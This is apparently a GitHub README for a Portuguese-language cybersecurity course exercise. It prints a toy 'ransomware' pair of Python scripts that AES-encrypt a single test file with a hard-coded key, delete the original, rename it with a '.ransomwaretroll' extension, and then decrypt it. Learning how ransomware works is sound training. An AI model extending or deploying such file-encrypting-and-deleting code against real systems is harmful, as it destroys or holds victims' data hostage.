# desafio-ransomware-curso-cyber-DIO
Criação ransomware pelo Kali linux - Desafio de Projeto - curso Cybersecurity Specialist

Print do arquivo py decrtpter.py

![image](https://github.com/W1ll14m92/desafio-ransomware-curso-cyber-DIO/assets/87369166/14f7aefc-c45d-416a-8055-4ebdb9403424)

Codigo 

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()


print do arquivo encrypter.py 

![image](https://github.com/W1ll14m92/desafio-ransomware-curso-cyber-DIO/assets/87369166/9ea351ad-47c8-4a10-a49f-3b0adbbc0936)

codigo fonte:

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()


